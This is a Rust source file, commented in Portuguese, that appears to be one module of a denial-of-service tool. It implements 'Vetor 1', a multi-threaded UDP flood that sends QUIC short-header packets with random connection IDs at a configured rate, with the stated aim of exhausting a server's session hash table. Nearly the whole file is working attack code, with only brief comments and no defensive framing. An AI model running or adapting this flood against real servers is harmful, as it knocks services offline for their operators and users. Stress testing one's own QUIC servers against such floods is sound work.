//! Vetor 1 — Raw CID Flooding via UDP.
//!
//! Envia pacotes UDP contendo Short Headers QUIC com CIDs gerados
//! aleatoriamente, explorando a exaustão da hash table de sessões do servidor.
//!
//! Referência: RFC 9000 §17.3 — Short Header Packets

use std::{
    net::UdpSocket,
    sync::Arc,
    time::{Duration, Instant},
};

use anyhow::Result;
use tracing::{debug, info};

use crate::{
    config::AttackConfig,
    metrics::MetricsCollector,
    utils::cid_gen::{build_short_header_packet, random_cid},
};

/// Configuração de um worker de raw flood.
pub struct RawFloodWorker {
    pub worker_id:  usize,
    pub target:     String,
    pub config:     AttackConfig,
    pub metrics:    Arc<MetricsCollector>,
}

impl RawFloodWorker {
    /// Executa o worker até `deadline` ser atingido.
    pub fn run(&self, deadline: Instant) -> Result<()> {
        let socket = UdpSocket::bind("0.0.0.0:0")?;
        socket.connect(&self.target)?;

        // Intervalo entre pacotes para atingir a taxa configurada
        let interval = if self.config.rate_pps > 0 {
            Duration::from_nanos(1_000_000_000 / self.config.rate_pps)
        } else {
            Duration::ZERO
        };

        info!(
            worker = self.worker_id,
            target = %self.target,
            rate_pps = self.config.rate_pps,
            cid_len = self.config.cid_len,
            "Raw flood worker iniciado"
        );

        let mut last_tick = Instant::now();

        while Instant::now() < deadline {
            let cid = random_cid(self.config.cid_len);
            let packet = build_short_header_packet(&cid);
            let pkt_len = packet.len() as u64;

            match socket.send(&packet) {
                Ok(_) => {
                    self.metrics.inc_packets(1);
                    self.metrics.inc_bytes(pkt_len);
                    debug!(worker = self.worker_id, cid_len = cid.len(), "Pacote enviado");
                }
                Err(e) => {
                    debug!(worker = self.worker_id, err = %e, "Falha no envio (ignorada)");
                }
            }

            // Rate limiting: espera apenas o tempo restante do intervalo
            if interval > Duration::ZERO {
                let elapsed = last_tick.elapsed();
                if elapsed < interval {
                    std::thread::sleep(interval - elapsed);
                }
                last_tick = Instant::now();
            }
        }

        info!(worker = self.worker_id, "Raw flood worker finalizado");
        Ok(())
    }
}

/// Lança N workers de raw flood em threads dedicadas.
///
/// Retorna quando todos os workers atingem `deadline`.
pub async fn run_raw_flood(
    target: String,
    config: AttackConfig,
    metrics: Arc<MetricsCollector>,
    deadline: Instant,
) -> Result<()> {
    let num_workers = config.workers;
    let mut handles = Vec::with_capacity(num_workers);

    for id in 0..num_workers {
        let worker = RawFloodWorker {
            worker_id: id,
            target:    target.clone(),
            config:    config.clone(),
            metrics:   metrics.clone(),
        };

        // Cada worker em thread dedicada para evitar contenção no runtime async
        let handle = std::thread::spawn(move || worker.run(deadline));
        handles.push(handle);
    }

    for handle in handles {
        if let Err(e) = handle.join() {
            tracing::error!("Worker encerrou com pânico: {:?}", e);
        }
    }

    Ok(())
}
